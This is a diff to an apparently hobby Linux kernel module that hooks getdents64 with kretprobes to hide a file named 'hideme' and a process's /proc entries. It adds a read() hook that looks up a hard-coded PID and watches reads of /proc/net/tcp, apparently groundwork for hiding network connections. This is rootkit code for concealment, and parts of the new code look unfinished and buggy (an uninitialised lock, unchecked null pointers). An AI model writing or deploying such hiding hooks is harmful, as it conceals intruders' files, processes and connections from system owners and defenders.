@@ -9,10 +9,14 @@
 #include <linux/dirent.h>
 #include <linux/string.h>
 #include <linux/fdtable.h>
+#include <linux/sched.h>
+#include <linux/mm_types.h>
+#include <linux/sched/signal.h>
 
 /// const file name to hide
 const char* hide_file_name = "hideme";
-const char* hide_pid_path = "/4361/fd";
+const pid_t hide_pid = 3789;
+const char* hide_pid_path = "/3789/fd";
 
 
 typedef bool (*entry_filter_t)(struct linux_dirent64*, void* data);
@@ -72,15 +76,85 @@ static int getents64_handle_return(struct kretprobe_instance *ri, struct pt_regs
     regs_set_return_value(regs, new_size);
 
     //pr_info("getdents64 (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
+    return 0;
+}
+
+struct read_arguments {
+    unsigned int fd;
+    void* buffer_ptr;
+    unsigned int count;
+};
+
+static int read_handle_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+    struct read_arguments* args;
+    // syscall wrappers __x64_sys_* gets only ptr to regs
+    regs = ((struct pt_regs*)regs->di);
+
+    if (!current->mm)
+        return 1;	/* Skip kernel threads */
+
+
+    args = (struct read_arguments*)ri->data;
+
+//    //unsigned long syscall = regs->orig_ax;
+    args->fd = regs->di; // 0
+    args->buffer_ptr = (void*)regs->si; // 1
+    args->count = regs->dx; // 2
+
+    return 0;
+}
+
+static int read_handle_return(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+    static rwlock_t tasklist_lock;
+
+    struct read_arguments* args = (struct read_arguments*) ri->data;
+    unsigned long buffer_count = regs_return_value(regs);
+
 
     // filter socket
-//    char fd_path[256];
-//
-//    struct file* file = files_lookup_fd_raw(current->files, args->fd);
-//    struct dentry* dentry = file->f_path.dentry;
-//    char* path = dentry_path_raw(dentry, fd_path, 256);
-//
-//    struct super_block* sb= file->f_path.mnt->mnt_sb;
+    char fd_path[256];
+
+    struct file* file = files_lookup_fd_raw(current->files, args->fd);
+    struct dentry* dentry = file->f_path.dentry;
+    char* path = dentry_path_raw(dentry, fd_path, 256);
+
+    struct super_block* sb= file->f_path.mnt->mnt_sb;
+
+    if(strcmp(sb->s_id, "devtmpfs") == 0)
+        return 0;
+    if(strcmp(sb->s_id, "anon_inodefs") == 0)
+        return 0;
+
+    // if(strcmp(path, "/kmsg") == 0 && ( strcmp(sb->s_id, "proc") == 0))
+    //     return 0;
+
+//    pr_info("read (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
+//    pr_info("path=%s, sb=%s\n", path, sb->s_id);
+
+//    pr_info("locking..\n");
+    read_lock(&tasklist_lock);
+    struct pid* pid = find_vpid(hide_pid);
+
+//    pr_info("found pid.. is null %d\n", pid == NULL);
+    struct task_struct* process_to_hide = pid_task(pid, PIDTYPE_PID);
+//    pr_info("found task.. is null=%d\n", process_to_hide == NULL);
+    atomic_t open_fds = process_to_hide->files->count;
+
+//    pr_info("unlocking..\n");
+    read_unlock(&tasklist_lock);
+
+    pr_info("read (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
+    pr_info("path=%s, sb=%s, name=%s, open_fds=%ld\n", path, sb->s_id, process_to_hide->comm, open_fds);
+
+
+    if(strcmp(sb->s_id, "proc") == 0){
+        if(strcmp(path, "/net/tcp") == 0){
+            pr_info("read (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
+            pr_info("path=%s, sb=%s, name=%s, open_fds=%ld\n", path, sb->s_id, process_to_hide->comm, open_fds);
+        }
+    }
 //
 //    // checking if the vfs is proc
 //    if(strcmp(sb->s_id, "proc") == 0){
@@ -116,12 +190,19 @@ static struct kretprobe getdents64_kret_probe = {
         .data_size = sizeof(struct getdent64_arguments),
 };
 
+static struct kretprobe read_kret_probe = {
+        .maxactive = 20,
+        .entry_handler = read_handle_entry,
+        .handler = read_handle_return,
+        .kp.symbol_name = "__x64_sys_read",
+        .data_size = sizeof(struct read_arguments),
+};
+
 
 static int __init entrypoint(void)
 {
-
-    if (register_kretprobe(&getdents64_kret_probe) < 0) {
-        pr_info("register_kretprobe failed\n");
+    if (register_kretprobe(&getdents64_kret_probe) < 0 || register_kretprobe(&read_kret_probe) < 0) {
+        pr_info("register_kretprobe  failed\n");
         return -1;
     }
     pr_info("kretprobe registered\n");
@@ -129,10 +210,14 @@ static int __init entrypoint(void)
 }
 
 static void __exit cleanup(void){
-    pr_info("Missed probing %d instances of %s\n",
+    pr_info("getdents64_kret_probe Missed probing %d instances of %s\n",
             getdents64_kret_probe.nmissed, getdents64_kret_probe.kp.symbol_name);
 
+    pr_info("read_kret_probe Missed probing %d instances of %s\n",
+            read_kret_probe.nmissed, read_kret_probe.kp.symbol_name);
+
     unregister_kretprobe(&getdents64_kret_probe);
+    unregister_kretprobe(&read_kret_probe);
     pr_info("Yarin Module cleanup\n");
 }
 
